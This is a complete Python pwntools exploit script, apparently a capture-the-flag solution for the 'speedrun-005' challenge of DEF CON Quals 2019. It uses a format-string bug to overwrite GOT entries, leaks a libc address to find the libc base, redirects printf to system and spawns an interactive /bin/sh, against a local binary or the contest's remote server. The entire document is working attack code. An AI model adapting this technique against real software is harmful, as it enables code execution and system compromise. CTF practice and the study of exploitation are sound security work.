#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./speedrun-005')
    puts_got = 0x601018
    printf_got = 0x601028
    main = 0x40069d
else:
    s = remote('speedrun-005.quals2019.oooverflow.io', 31337)
    puts_got = 0x601020
    printf_got = 0x601030
    main = 0x40072d

elf = ELF('./speedrun-005')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload = ''
prev = 0
for i, x in enumerate(p64(main)):
    payload += '%{}x'.format(ord(x) - prev + 0x100)
    payload += '%{}$hhn'.format(19 + i)
    prev = ord(x)
payload += '%85$p'
payload += 'A' * (8 - len(payload) % 8)
for i in range(8):
    payload += p64(puts_got + i)
s.send(payload)
s.recvuntil('Interesting ')
libc_base = int(s.recvuntil('A')[-15:-1], 0x10) - 0x1b3787
log.info('libc base: %#x' % libc_base)

payload = ''
payload += '/bin/sh;'
prev = 8
for i, x in enumerate(p64(libc_base + libc.symbols['system'])):
    payload += '%{}x'.format(ord(x) - prev + 0x100)
    payload += '%{}$hhn'.format(19 + i)
    prev = ord(x)
payload += 'A' * (8 - len(payload) % 8 & 7)
for i in range(8):
    payload += p64(printf_got + i)
s.send(payload)

s.interactive()
